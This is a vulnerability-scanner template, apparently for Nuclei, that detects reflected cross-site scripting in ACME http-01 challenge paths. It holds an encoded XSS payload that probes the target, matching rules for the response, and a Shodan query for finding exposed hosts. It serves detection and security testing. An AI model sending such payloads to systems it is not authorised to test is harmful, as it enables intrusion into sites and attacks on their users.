http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "<script>alert(document.domain)</script>")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E'
id: acme-challenge-path-xss
info:
  author: pussycat0x
  description: 'Detects XSS vulnerabilities in ACME http-01 challenge implementations
    where hosting providers reflect the challenge key from the URL without proper
    sanitization

    '
  metadata:
    shodan-query: html:"acme-challenge"
  name: ACME Challenge Path - Reflected Cross-Site Scripting
  reference:
  - https://labs.detectify.com/security-guidance/xss-using-quirky-implementations-of-acme-http-01/
  - https://www.acunetix.com/vulnerabilities/web/cross-site-scripting-in-http-01-acme-challenge-implementation/
  severity: low
  tags: xss,acme,misconfig,vuln
